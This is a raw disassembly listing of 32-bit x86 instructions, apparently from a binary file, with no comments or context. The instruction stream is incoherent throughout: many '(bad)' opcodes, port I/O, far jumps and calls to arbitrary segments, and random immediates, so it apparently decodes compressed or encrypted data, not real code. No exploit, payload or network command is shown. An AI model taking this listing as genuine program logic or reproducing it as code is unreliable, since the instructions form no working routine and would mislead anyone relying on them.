  4239a2:	jbe    0x4239b3
  4239a4:	shl    DWORD PTR ss:[ebx],cl
  4239a7:	fcmovu st,st(5)
  4239a9:	clc    
  4239aa:	and    DWORD PTR [esi+0x7d08d42e],ebx
  4239b0:	mov    eax,0x924b50c0
  4239b5:	mov    cl,0xc7
  4239b7:	xchg   esi,eax
  4239b8:	shr    DWORD PTR [esp+edi*2],0x92
  4239bc:	je     0x42399b
  4239be:	push   esp
  4239bf:	loopne 0x42398a
  4239c1:	mov    ch,0xba
  4239c3:	out    0x34,eax
  4239c5:	aam    0xf7
  4239c7:	lods   eax,DWORD PTR ds:[esi]
  4239c8:	icebp  
  4239c9:	or     ah,ch
  4239cb:	mov    al,0x81
  4239cd:	movsx  ebx,ch
  4239d0:	(bad)  
  4239d1:	fdiv   DWORD PTR [esi]
  4239d3:	fcomip st,st(1)
  4239d5:	outs   dx,BYTE PTR gs:[esi]
  4239d7:	mov    bl,BYTE PTR [eax-0x36]
  4239da:	out    dx,al
  4239db:	pop    ds
  4239dc:	sub    al,0xf7
  4239de:	pop    esi
  4239df:	dec    eax
  4239e0:	ror    ch,0x52
  4239e3:	mov    BYTE PTR [ecx+0x68],0x8c
  4239e7:	lds    eax,FWORD PTR [ecx+esi*1-0x61]
  4239eb:	sbb    DWORD PTR [edx-0x6b364982],ecx
  4239f1:	aas    
  4239f2:	in     al,0x64
  4239f4:	or     DWORD PTR ds:0xccbe0a8e,0x7bcdb803
  4239fe:	cmp    cl,ch
  423a00:	int    0x14
  423a02:	cmp    bl,BYTE PTR [esi]
  423a04:	jl     0x4239be
  423a06:	jg     0x423989
  423a08:	xchg   ebp,eax
  423a09:	dec    edx
  423a0a:	test   eax,0xc91afafb
  423a0f:	cmp    bh,BYTE PTR ds:[edi+0x7d]
  423a13:	push   ds
  423a14:	inc    edx
  423a15:	cmp    eax,0x5fdbe2de
  423a1a:	pop    ecx
  423a1b:	or     edi,DWORD PTR [edx]
  423a1d:	jge    0x4239ae
  423a1f:	mul    dl
  423a21:	or     BYTE PTR [edi-0x49],0x72
  423a25:	je     0x4239d9
  423a27:	inc    ecx
  423a28:	jmp    0xb77f069e
  423a2d:	xor    dh,BYTE PTR [eax]
  423a2f:	(bad)  
  423a30:	jg     0x423a2c
  423a32:	mov    edi,es
  423a34:	loope  0x423a50
  423a36:	xor    ecx,DWORD PTR [edx]
  423a38:	push   edx
  423a39:	and    edx,DWORD PTR [edi]
  423a3b:	jle    0x423a7c
  423a3d:	mov    edi,0x937c1b0d
  423a42:	sub    DWORD PTR [edx-0x2b],edx
  423a45:	clc    
  423a46:	cld    
  423a47:	test   DWORD PTR [esi-0x5c08c229],esp
  423a4d:	adc    DWORD PTR [esi-0x2c],ecx
  423a50:	or     BYTE PTR [eax+edi*4],ch
  423a53:	enter  0x4cc0,0xb6
  423a57:	mov    esp,0x790f9abb
  423a5c:	push   ebx
  423a5d:	xor    ecx,esi
  423a5f:	sar    DWORD PTR [edx+0x75da530d],cl
  423a65:	loop   0x423a93
  423a67:	rol    DWORD PTR [ebp-0x6d696e22],1
  423a6d:	imul   esi,DWORD PTR [edx-0x3],0x29691c3b
  423a74:	adc    dl,BYTE PTR [edi+0x5b]
  423a77:	xchg   esi,eax
  423a78:	iret   
  423a79:	dec    esp
  423a7a:	sbb    al,0x9c
  423a7c:	int    0x57
  423a7e:	pop    ecx
  423a7f:	inc    ebp
  423a80:	dec    esp
  423a81:	pop    esi
  423a82:	push   esp
  423a83:	jnp    0x423ab9
  423a85:	jmp    0x2aa20503
  423a8a:	pop    ebx
  423a8b:	sbb    eax,0xb7f05326
	...
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	adc    al,0xef
  423b02:	daa    
  423b03:	xchg   esp,eax
  423b04:	jl     0x423b82
  423b06:	add    DWORD PTR [eax],eax
  423b08:	add    al,0x1
  423b0a:	add    BYTE PTR [eax],al
  423b0c:	push   esi
  423b0d:	or     bh,al
  423b0f:	aaa    
  423b10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b11:	push   esi
  423b12:	loopne 0x423b4e
  423b14:	dec    edx
  423b15:	pushf  
  423b16:	jmp    0x1a85:0x415aeccc
  423b1d:	sar    DWORD PTR ds:0xe0e39bd1,1
  423b23:	fs dec esp
  423b25:	sbb    eax,0x7e791bfb
  423b2a:	pop    ds
  423b2b:	xchg   esp,eax
  423b2c:	jmp    0x423b8a
  423b2e:	mov    dl,BYTE PTR [eax]
  423b30:	jo     0x423ac8
  423b32:	ins    BYTE PTR es:[edi],dx
  423b33:	adc    al,0x1c
  423b35:	or     al,BYTE PTR [edi+ebx*4]
  423b38:	lahf   
  423b39:	shl    bh,cl
  423b3b:	ins    DWORD PTR es:[edi],dx
  423b3c:	jmp    0x68e9:0x4b2f5843
  423b43:	inc    ebx
  423b44:	xlat   BYTE PTR ds:[ebx]
  423b45:	and    al,0x20
  423b47:	pop    es
  423b48:	icebp  
  423b49:	dec    edx
  423b4a:	xchg   esp,eax
  423b4b:	dec    esi
  423b4c:	repnz xchg edx,eax
  423b4e:	clc    
  423b4f:	sar    DWORD PTR [edx],1
  423b51:	fbstp  TBYTE PTR [ebp+0x2e]
  423b54:	inc    ebp
  423b55:	sbb    DWORD PTR [ebp+0x614336ad],edi
  423b5b:	push   ds
  423b5c:	dec    ebp
  423b5d:	mov    cl,0xd
  423b5f:	loop   0x423b1f
  423b61:	pop    si
  423b63:	sar    ebx,cl
  423b65:	push   eax
  423b66:	jb     0x423b70
  423b68:	cli    
  423b69:	int    0xc3
  423b6b:	(bad)  
  423b6d:	xchg   esp,eax
  423b6e:	sbb    eax,0xd167b987
  423b73:	add    eax,0xe4c304c2
  423b78:	and    BYTE PTR [eax],bh
  423b7a:	push   esp
  423b7b:	test   DWORD PTR [ecx],ecx
  423b7d:	rcr    cl,1
  423b7f:	jae    0x423b66
  423b81:	mov    esp,ebx
  423b83:	xchg   BYTE PTR [esi],bl
  423b85:	out    dx,al
  423b86:	rcl    al,0x77
  423b89:	push   esi
  423b8a:	push   edx
  423b8b:	rcr    dh,0x1a
  423b8e:	jge    0x423b1d
  423b90:	call   0x25ba8dec
  423b95:	in     eax,0x15
  423b97:	jle    0x423bea
  423b99:	in     al,0x80
  423b9b:	xor    BYTE PTR [edx+0x4a],dh
  423b9e:	xor    esp,DWORD PTR [ebx-0x1c]
  423ba1:	dec    ecx
  423ba2:	xchg   eax,eax
  423ba4:	sub    eax,0x820c617f
  423ba9:	or     dl,BYTE PTR [edi-0x53]
  423bac:	push   edx
  423bad:	shr    BYTE PTR [esi+0x57],cl
  423bb0:	mov    al,0x6
  423bb2:	adc    DWORD PTR [edi-0x3b645c9],ebx
  423bb8:	into   
  423bb9:	fidivr DWORD PTR [ecx+0x64]
  423bbc:	call   0x7d5fd38d
  423bc1:	sbb    al,0xbf
  423bc3:	mov    ds:0x54e1493,al
  423bc8:	pop    esi
  423bc9:	shl    BYTE PTR [ebp-0x18d74240],1
  423bcf:	(bad)  
  423bd0:	popf   
  423bd1:	jae    0x423b72
  423bd3:	out    dx,eax
  423bd4:	iret   
  423bd5:	je     0x423c02
  423bd7:	loopne 0x423b8a
  423bd9:	xchg   DWORD PTR [ebx+0x30],esi
  423bdc:	or     eax,0x8076e883
  423be1:	sub    DWORD PTR [ecx+0x4e5ddf27],ebp
  423be7:	mov    ecx,0x8cfb194f
  423bec:	addr16 xchg esp,eax
  423bee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423bef:	fsubr  DWORD PTR [esi+0x536eb53e]
  423bf5:	or     esp,ecx
  423bf7:	jle    0x423bba
  423bf9:	push   0x9e0749b
  423bfe:	or     cl,BYTE PTR [ebp+ecx*2+0x74cea770]
  423c05:	inc    eax
  423c06:	les    edx,FWORD PTR [eax]
  423c08:	mov    ds:0x6f69b8e9,eax
  423c0d:	(bad)  
  423c0e:	jae    0x423bba
	...
  423c74:	std    
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax-0x67bb99e9]
  423c81:	or     al,0x1f
  423c83:	pop    esp
  423c84:	cmp    BYTE PTR [ebp+0x1],0x0
  423c88:	add    al,0x1
  423c8a:	add    BYTE PTR [eax],al
  423c8c:	pop    ebx
  423c8d:	bound  esp,QWORD PTR [edi]
  423c8f:	bnd ret 
  423c91:	je     0x423ce1
  423c93:	cdq    
  423c94:	mov    eax,ds:0x5a640bd4
  423c99:	add    BYTE PTR [ebx+edi*8],cl
  423c9c:	repnz hlt 
  423c9e:	dec    ecx
  423c9f:	out    0xd3,al
  423ca1:	mov    bl,0x19
  423ca3:	adc    DWORD PTR fs:[eax+0x31],edi
  423ca7:	bound  ebp,QWORD PTR [ebx]
  423ca9:	xchg   ebp,eax
  423caa:	lea    ebp,[ebx-0x69]
  423cad:	les    eax,FWORD PTR [eax-0x46]
  423cb0:	cwde   
  423cb1:	std    
  423cb2:	mov    ecx,0x640d0a9d
  423cb7:	pop    ebx
  423cb8:	push   edi
  423cb9:	stos   BYTE PTR es:[edi],al
  423cba:	js     0x423c75
  423cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423cbd:	dec    ecx
  423cbe:	cmp    bh,BYTE PTR [ebx]
  423cc0:	aaa    
  423cc1:	mov    cl,0xe8
  423cc3:	cmp    ebx,DWORD PTR [eax-0x1c]
  423cc6:	repz pop eax
  423cc8:	(bad)  
  423cc9:	fidiv  WORD PTR [esp+ecx*1+0x713bd108]
  423cd0:	imul   edx,DWORD PTR [edi+eiz*4-0x26],0x8
  423cd5:	sahf   
  423cd6:	cwde   
  423cd7:	or     WORD PTR ds:0x166b3a14,bx
  423cde:	mul    ebx
  423ce0:	or     edx,DWORD PTR [eax+0x12]
  423ce3:	adc    al,dh
  423ce5:	lock push ss
  423ce7:	pop    ds
  423ce8:	xchg   edi,eax
  423ce9:	sub    al,0xbc
  423ceb:	sub    dl,BYTE PTR ds:0x2a85f71a
  423cf1:	inc    ecx
  423cf2:	and    eax,0xc891cce
  423cf7:	jp     0x423d27
  423cf9:	outs   dx,DWORD PTR ds:[esi]
  423cfa:	mov    esp,0x6b1e3421
  423cff:	xchg   edx,eax
  423d00:	cmc    
  423d01:	inc    esp
  423d02:	and    BYTE PTR [eax-0x16a31c5c],al
  423d08:	into   
  423d09:	sub    bh,bl
  423d0b:	(bad)
  423d0e:	jnp    0x423c9c
  423d10:	inc    dl
  423d12:	cmp    al,0x83
  423d14:	dec    esi
  423d15:	mov    eax,0xbcd990
  423d1a:	xchg   edx,eax
  423d1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d1c:	sub    BYTE PTR [ebx],dl
  423d1e:	mov    DWORD PTR [esi-0x53],0x732be01e
  423d25:	pop    ss
  423d26:	call   0xa9b1:0x8051c1d0
  423d2d:	ins    DWORD PTR es:[edi],dx
  423d2e:	data16 js 0x423d80
  423d31:	test   al,0x6f
  423d33:	jle    0x423d3a
  423d35:	jle    0x423d2d
  423d37:	lahf   
  423d38:	cmp    cl,BYTE PTR [ebx-0x6dcbcf39]
  423d3e:	rol    edx,cl
  423d40:	inc    edi
  423d41:	rcr    BYTE PTR [ecx-0x248c9ad4],1
  423d47:	in     al,dx
  423d48:	(bad)  
  423d49:	ror    BYTE PTR [esi+0x6223f90],1
  423d4f:	aam    0x3a
  423d51:	sub    BYTE PTR [eax+ebp*2-0x6acc80ca],ah
  423d58:	fdivr  QWORD PTR [eax-0x2f]
  423d5b:	xchg   ebp,eax
  423d5c:	cwde   
  423d5d:	sub    cl,BYTE PTR [edx+0x6520017]
  423d63:	rol    DWORD PTR [eax+0x5601573b],1
  423d69:	aad    0x30
  423d6b:	pop    eax
  423d6c:	js     0x423de7
  423d6e:	imul   ebp,edi,0xffffffe3
  423d71:	jecxz  0x423de2
  423d73:	es cmp eax,0x1515ea11
  423d79:	cwde   
  423d7a:	mov    cl,0xc2
  423d7c:	dec    esp
  423d7d:	inc    edi
  423d7e:	or     eax,0xd0dfd7a6
  423d83:	cmp    eax,edx
  423d85:	or     DWORD PTR [eax+0x7ae55237],esp
  423d8b:	js     0x423d7e
  423d8d:	stc    
  423d8e:	leave  
  423d8f:	cmp    eax,DWORD PTR [eax]
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax+0x6474f2d2],esp
  423e03:	imul   eax,DWORD PTR [esi+edi*2+0x1040001],0x1e7c0000
  423e0e:	xor    BYTE PTR [edx-0x7a9ddd2e],0xb0
  423e15:	pushf  
  423e16:	ss fdiv st(2),st
  423e19:	lock mov esp,0xc881516c
  423e1f:	sub    bl,dl
  423e21:	xlat   BYTE PTR ds:[ebx]
  423e22:	xor    esp,esp
  423e24:	dec    esp
  423e25:	pop    esp
  423e26:	call   0x68f2:0xacb788ff
  423e2d:	loop   0x423e7b
  423e2f:	mov    cl,0x5c
  423e31:	mov    al,0x3d
  423e33:	retf   
  423e34:	mov    ah,0xd8
  423e36:	pop    ebx
  423e37:	dec    ch
  423e39:	lahf   
  423e3a:	adc    al,0x23
  423e3c:	push   edx
  423e3d:	xchg   bh,ah
  423e3f:	loope  0x423e7f
  423e41:	sti    
  423e42:	jecxz  0x423e06
  423e44:	mov    bl,0x5d
  423e46:	xchg   BYTE PTR [esi+ecx*2-0x45283d1a],dl
  423e4d:	mov    ebx,0x274a9386
  423e52:	in     al,dx
  423e53:	jo     0x423e71
  423e55:	lods   eax,DWORD PTR ds:[esi]
  423e56:	cmp    bl,dh
  423e58:	adc    esi,DWORD PTR [ebp+0x50ffa691]
  423e5e:	inc    esi
  423e5f:	sbb    BYTE PTR [eax],al
  423e61:	dec    ebp
  423e62:	ret    0x9b08
  423e65:	inc    eax
  423e66:	fcomip st,st(1)
  423e68:	test   BYTE PTR [edx],ch
  423e6a:	retf   0xff86
  423e6d:	cmp    al,0xd4
  423e6f:	xchg   BYTE PTR [edi],dl
  423e71:	sbb    BYTE PTR [eax+ebp*1+0x455e32b2],dh
  423e78:	xchg   ebx,eax
  423e79:	add    DWORD PTR [edi],ebp
  423e7b:	mov    ch,0x1a
  423e7d:	data16 sub ch,BYTE PTR [edi]
  423e80:	inc    edi
  423e81:	jno    0x423e1c
  423e83:	popa   
  423e84:	jmp    0x423e8d
  423e86:	lock inc edi
  423e88:	pusha  
  423e89:	repz jnp 0x423ec4
  423e8c:	cmp    eax,0x9c52796d
  423e91:	adc    BYTE PTR [ebp+0x2b40174],0xe9
  423e98:	mov    edx,0x23531d4f
  423e9d:	and    bh,BYTE PTR [eax]
  423e9f:	pop    eax
  423ea0:	rcr    BYTE PTR ds:0xb452d42c,cl
  423ea6:	(bad)  
  423ea7:	jp     0x423e84
  423ea9:	gs jno 0x423efb
  423eac:	bswap  ecx
  423eae:	pop    ebx
  423eaf:	xchg   edi,eax
  423eb0:	sar    ecx,1
  423eb2:	inc    esp
  423eb3:	adc    al,0xc1
  423eb5:	push   ebx
  423eb6:	mov    eax,0x898dc841
  423ebb:	or     esp,DWORD PTR [ebp-0xe]
  423ebe:	hlt    
  423ebf:	fmul   QWORD PTR [eax]
  423ec1:	jecxz  0x423efb
  423ec3:	shl    BYTE PTR [ebx],1
  423ec5:	repnz mov ds:0xb8e4fff2,al
  423ecb:	add    eax,0x8d9d738b
  423ed0:	jnp    0x423eef
  423ed2:	popa   
  423ed3:	repnz mov bh,0x6
  423ed6:	sub    al,0x16
  423ed8:	sar    BYTE PTR [edx],0xca
  423edb:	xor    BYTE PTR ds:0x364b41be,dl
  423ee1:	test   DWORD PTR [eax],ebp
  423ee3:	add    eax,0x819e271a
  423ee8:	xor    DWORD PTR [ecx-0x79],edx
  423eeb:	mov    ch,BYTE PTR [edi-0x7d]
  423eee:	push   ecx
  423eef:	add    ch,BYTE PTR [ebx]
  423ef1:	add    ah,BYTE PTR [edx]
  423ef3:	jnp    0x423f34
  423ef5:	push   es
  423ef6:	imul   eax,DWORD PTR [ebp-0x4],0xffffffb1
  423efa:	sbb    DWORD PTR cs:[esi*4+0x500a34ff],0x4b
  423f03:	call   0xedbe:0x26c60d3e
  423f0a:	dec    eax
  423f0b:	lods   al,BYTE PTR ds:[esi]
  423f0c:	sbb    DWORD PTR [edx+0xf046],edx
	...
  423f72:	add    BYTE PTR [eax],al
  423f74:	scas   al,BYTE PTR es:[edi]
  423f75:	call   0x9fff:0xff74b964
  423f7c:	adc    al,0x96
  423f7e:	sbb    al,0xd9
  423f80:	(bad)  
  423f81:	mov    cs,WORD PTR [edi+0x17f8815]
  423f87:	add    BYTE PTR [ecx+eax*1],al
  423f8a:	add    BYTE PTR [eax],al
  423f8c:	pusha  
  423f8d:	or     BYTE PTR [ecx+0x79],dh
  423f90:	sub    eax,0xdd9a3d4e
  423f95:	in     al,dx
  423f96:	stc    
  423f97:	dec    esp
  423f98:	pop    ebp
  423f99:	dec    edx
  423f9a:	or     DWORD PTR [esi+ebx*1-0x3a],0x31
  423f9f:	dec    ebx
  423fa0:	push   DWORD PTR [edx+0x5f]
  423fa3:	es dec ebp
  423fa5:	inc    esp
  423fa6:	retf   0x2d82
  423fa9:	jp     0x423fe0
  423fab:	aas    
  423fac:	sti    
  423fad:	adc    eax,0x66d14691
  423fb2:	adc    al,BYTE PTR [ecx+0x27]
  423fb5:	imul   DWORD PTR [esi]
  423fb7:	push   ecx
  423fb8:	cdq    
  423fb9:	in     eax,0xa1
  423fbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fbc:	or     al,0xe4
  423fbe:	fdiv   st,st(7)
  423fc0:	shl    dl,cl
  423fc2:	xchg   DWORD PTR es:[eax+0x1f],esp
  423fc6:	gs scas eax,DWORD PTR es:[edi]
  423fc8:	mov    ebp,0xc0f8f139
  423fcd:	jmp    0xfbb:0x234fc68a
  423fd4:	mov    dl,0x4e
  423fd6:	call   0x5d25:0xc56bb970
  423fdd:	xor    ch,ch
  423fdf:	dec    eax
  423fe0:	ret    
  423fe1:	aad    0x81
  423fe3:	fwait
  423fe4:	lds    ecx,FWORD PTR [esi+ebp*1-0x62]
  423fe8:	mov    eax,0x6d19dccf
  423fed:	ret    
  423fee:	cmp    bl,bh
  423ff0:	mul    BYTE PTR [ebx-0x65]
  423ff3:	lds    esi,FWORD PTR [ecx+0x6803b6f5]
  423ff9:	ds add bl,ah
  423ffc:	push   eax
  423ffd:	(bad)  
  423ffe:	stos   DWORD PTR es:[edi],eax
  423fff:	or     al,0x1a
  424001:	sub    eax,0x8e1ab103
  424006:	mov    bl,bh
  424008:	and    esi,DWORD PTR [eax-0x42]
  42400b:	call   0x27a722e0
  424010:	or     al,0xb2
  424013:	adc    eax,ebp
  424015:	sub    DWORD PTR [ebp-0x60],0x3c6837ea
  42401c:	push   0xe6c0f225
  424021:	rcr    bh,0x2f
  424024:	leave  
  424025:	push   edx
  424026:	push   0x66
  424028:	in     eax,dx
  424029:	jb     0x423ffd
  42402b:	or     ecx,esi
  42402d:	cmc    
  42402e:	or     bl,cl
  424030:	jae    0x423fc8
  424032:	std    
  424033:	aas    
  424034:	xchg   edi,eax
  424035:	jp     0x423fd6
  424037:	call   0x8ad3:0x9cc32a00
  42403e:	push   esi
  42403f:	xchg   ebx,eax
  424040:	lahf   
  424041:	push   esp
  424042:	(bad)  
  424043:	jle    0x424074
  424045:	je     0x423fcf
  424047:	xchg   ecx,eax
  424048:	call   0x5558d5fd
  42404d:	or     al,cl
  42404f:	cs jb  0x42406a
  424052:	(bad)  
  424054:	stc    
  424055:	ret    0x4283
  424058:	loop   0x423ff4
  42405a:	push   esp
  42405b:	or     eax,0x583fca29
  424060:	xor    eax,0x9f1ebad2
  424065:	ret    0x4351
  424068:	data16 data16 loop 0x424039
  42406c:	and    al,0x8b
  42406e:	pop    ecx
  42406f:	xchg   esp,eax
  424070:	addr16 cmp bh,dl
  424073:	call   0x136c1c6b
  424078:	enter  0x1124,0x47
  42407c:	mov    ecx,0xde132847
  424081:	mov    WORD PTR [ecx],gs
  424083:	add    eax,DWORD PTR ds:0xfcf68b10
  424089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42408a:	xor    DWORD PTR [ebp-0x3d],esp
  42408d:	sahf   
  42408e:	lods   al,BYTE PTR ds:[esi]
  42408f:	dec    ecx
	...
  4240f4:	jl     0x42414e
  4240f6:	cs mov cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	inc    ebx
  424101:	pop    esi
  424102:	mov    bl,0x62
  424104:	mov    WORD PTR [eax+0x1040001],es
  42410a:	add    BYTE PTR [eax],al
  42410c:	ror    BYTE PTR [esi],0xe7
  42410f:	inc    esp
  424110:	mov    ah,0x8c
  424112:	test   eax,0x183f4811
  424117:	xchg   edx,eax
  424118:	aaa    
  424119:	add    al,0x70
  42411b:	jns    0x424159
  42411d:	and    ch,BYTE PTR [ecx-0x56]
  424120:	sbb    dh,BYTE PTR [ecx+0x7b]
  424123:	ret    0x342a
  424126:	pusha  
  424127:	mov    ebp,0x1519cc77
  42412c:	adc    DWORD PTR [edi+0x7d71e589],edi
  424132:	sar    ebp,cl
  424134:	push   ss
  424135:	inc    esi
  424136:	pop    eax
  424137:	adc    esp,DWORD PTR [edi+0x33896fb9]
  42413d:	lahf   
  42413e:	xchg   BYTE PTR [edx+ecx*1-0x7],ch
  424142:	scas   al,BYTE PTR es:[edi]
  424143:	adc    edi,ecx
  424145:	xlat   BYTE PTR ds:[ebx]
  424146:	inc    ebp
  424147:	push   edx
  424148:	pop    es
  424149:	adc    edx,ebp
  42414b:	mov    BYTE PTR [ecx+0x71f4e935],bh
  424151:	aad    0xdd
  424153:	enter  0xcfde,0x9f
  424157:	jne    0x4241cb
  424159:	popa   
  42415a:	fld    QWORD PTR [ecx]
  42415c:	dec    ecx
  42415d:	imul   esi,DWORD PTR [eax-0x6b837fd0],0x47
  424164:	mov    DWORD PTR [ecx+0x6a52a735],ecx
  42416a:	lds    ebx,FWORD PTR ds:0xea179df5
  424170:	shr    DWORD PTR [edx+0x6a01ef8b],cl
  424176:	pop    eax
  424177:	dec    esi
  424178:	cmp    al,0x6c
  42417a:	inc    esp
  42417b:	dec    bh
  42417d:	aam    0x3f
  42417f:	fild   QWORD PTR [ebp+0x1e]
  424182:	fs mov dl,0x23
  424185:	push   cs
  424186:	adc    BYTE PTR [edi-0x32314013],dh
  42418c:	fwait
  42418d:	out    dx,eax
  42418e:	sbb    al,0x6
  424190:	jo     0x4241a1
  424192:	test   DWORD PTR es:[edi+0x2e],eax
  424196:	jb     0x4241ea
  424198:	(bad)  
  424199:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42419a:	les    ebx,FWORD PTR [edx+0xa2fa138]
  4241a0:	mov    ebx,0x5f038911
  4241a5:	shl    DWORD PTR [esi],0x20
  4241a8:	dec    esp
  4241a9:	cmc    
  4241aa:	stc    
  4241ab:	fimul  DWORD PTR [edx+esi*2]
  4241ae:	push   0xfffffff6
  4241b0:	int    0xf2
  4241b2:	cs pop edi
  4241b4:	(bad)  [edi]
  4241b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241b7:	dec    edi
  4241b8:	mov    esp,0xddaf5c3a
  4241bd:	ja     0x42419e
  4241bf:	mov    ecx,0x276a0637
  4241c4:	cmc    
  4241c5:	sbb    cl,bh
  4241c7:	jmp    0x4241a1
  4241c9:	call   0x7aafdb70
  4241ce:	push   cs
  4241cf:	mov    dh,0x89
  4241d1:	cmp    eax,0x5cc8ecfa
  4241d6:	dec    esi
  4241d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241d8:	xor    al,0xd7
  4241da:	test   al,0xa5
  4241dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241dd:	fnstsw WORD PTR [esi]
  4241df:	jle    0x424175
  4241e1:	test   BYTE PTR [esp+ebp*8],al
  4241e4:	push   0xffffff91
  4241e6:	mov    dh,BYTE PTR [eax-0x489512e8]
  4241ec:	xor    al,dh
  4241ee:	mov    ecx,0xe67c52b5
  4241f3:	inc    edi
  4241f4:	jnp    0x4241dd
  4241f6:	ins    DWORD PTR es:[edi],dx
  4241f7:	jge    0x424225
  4241f9:	mov    cl,0xa2
  4241fb:	outs   dx,DWORD PTR ds:[esi]
  4241fc:	push   0x3
  4241fe:	sbb    BYTE PTR [ebx+0x58],bl
  424201:	rol    BYTE PTR [ebp+0x46],1
  424204:	fdiv   QWORD PTR [esi+0x1]
  424207:	repz mov ch,0x1c
  42420a:	loope  0x42422f
  42420c:	push   ebp
  42420d:	mov    dl,0x89
  42420f:	mov    bh,0x0
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	loope  0x424267
  424282:	sbb    dh,BYTE PTR ds:0x18190
  424288:	add    al,0x1
  42428a:	add    BYTE PTR [eax],al
  42428c:	xchg   edi,eax
  42428d:	mov    esp,0xff52e955
  424292:	mov    esp,DWORD PTR [esi]
  424294:	push   ebp
  424295:	adc    BYTE PTR [esi-0x5f5c7ea9],ah
  42429b:	fld1   
  42429d:	ins    BYTE PTR es:[edi],dx
  42429e:	cli    
  42429f:	std    
  4242a0:	mov    edi,0x69aceedc
  4242a5:	xchg   edx,eax
  4242a6:	(bad)  
  4242a8:	bound  ebp,QWORD PTR [eax+0x30]
  4242ab:	jle    0x424263
  4242ad:	mov    dl,0x37
  4242af:	int    0x36
  4242b1:	call   0x9400:0x1e679599
  4242b8:	jbe    0x4242ef
  4242ba:	jno    0x42426c
  4242bc:	xchg   ebx,eax
  4242bd:	jb     0x42429e
  4242bf:	inc    esp
  4242c0:	push   ecx
  4242c1:	add    BYTE PTR [edx-0x6d5fc1b],0xd2
  4242c8:	mov    ecx,0x8f78ca3a
  4242cd:	jnp    0x42428f
  4242cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242d0:	enter  0xab44,0x3d
  4242d4:	scas   al,BYTE PTR es:[edi]
  4242d5:	mov    ds,esp
  4242d7:	test   ecx,0x2abbfacd
  4242dd:	dec    eax
  4242de:	inc    ecx
  4242df:	scas   eax,DWORD PTR es:[edi]
  4242e0:	adc    al,0xfd
  4242e2:	mov    edi,0x5406c910
  4242e7:	or     al,0xfc
  4242e9:	mov    DWORD PTR [esi],0x4730a271
  4242ef:	mov    ds:0xc227b60a,al
  4242f4:	xchg   edi,eax
  4242f5:	xor    esp,DWORD PTR [ebx-0x245123f4]
  4242fb:	xor    edi,DWORD PTR ds:[edx+esi*1+0x4b]
  424300:	jg     0x424307
  424302:	or     al,0xa5
  424304:	push   ecx
  424305:	pop    ebp
  424306:	es jbe 0x4242c1
  424309:	jl     0x42434c
  42430b:	push   0xf21246b5
  424310:	xor    DWORD PTR [eax+ebx*8+0x67],esi
  424314:	outs   dx,DWORD PTR ds:[esi]
  424315:	ret    
  424316:	jne    0x4242d4
  424318:	mov    ebp,0xa815d953
  42431d:	jb     0x4242f4
  42431f:	sub    edi,ebp
  424321:	mov    al,0xcf
  424323:	pusha  
  424324:	arpl   WORD PTR [ebx],bp
  424326:	dec    ebp
  424327:	cmc    
  424328:	mov    ch,0xd2
  42432a:	xor    BYTE PTR [ebx+0xd],0x7a
  42432e:	sbb    al,0x9a
  424330:	sub    eax,0x5b5ea119
  424335:	pop    ds
  424336:	pop    ebp
  424337:	scas   al,BYTE PTR es:[edi]
  424338:	js     0x4242e1
  42433a:	dec    esp
  42433b:	cmp    al,0x28
  42433d:	xor    dl,ah
  42433f:	xchg   ebp,eax
  424340:	loop   0x4242d9
  424342:	inc    ebx
  424343:	inc    edx
  424344:	adc    DWORD PTR [ebx+0xa],esi
  424347:	fisub  WORD PTR [edx-0x670eb680]
  42434d:	data16 cmp al,0x19
  424350:	xchg   ebp,eax
  424351:	pushf  
  424352:	xlat   BYTE PTR ds:[ebx]
  424353:	mov    edx,DWORD PTR [eax+0x324e78c]
  424359:	imul   esp,DWORD PTR [eax],0xffffffb9
  42435c:	pop    ebx
  42435d:	push   0x5ea3826f
  424362:	jmp    0x3e2d62f9
  424367:	xor    al,0x52
  424369:	and    ebp,edx
  42436b:	or     esp,ecx
  42436d:	xor    al,0x31
  42436f:	cs iret 
  424371:	iret   
  424372:	outs   dx,DWORD PTR ds:[esi]
  424373:	icebp  
  424374:	dec    esi
  424375:	push   edx
  424376:	push   eax
  424377:	and    bh,bh
  424379:	fnstsw WORD PTR gs:[ecx]
  42437c:	inc    esi
  42437d:	xlat   BYTE PTR ds:[ebx]
  42437e:	mov    eax,0x31c0f699
  424383:	ins    BYTE PTR es:[edi],dx
  424384:	(bad)  
  424385:	xor    BYTE PTR [ebx+0x71],ah
  424388:	out    dx,al
  424389:	sub    al,0x6c
  42438b:	popa   
  42438c:	mov    eax,ds:0x452288
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x424422
  424401:	sub    esp,ebp
  424403:	sbb    eax,0x18294
  424408:	add    al,0x1
  42440a:	add    BYTE PTR [eax],al
  42440c:	loop   0x424398
  42440e:	fistp  WORD PTR [ebp+0x31c62d34]
  424414:	in     al,0xc0
  424416:	aam    0x53
  424418:	mov    bh,0x18
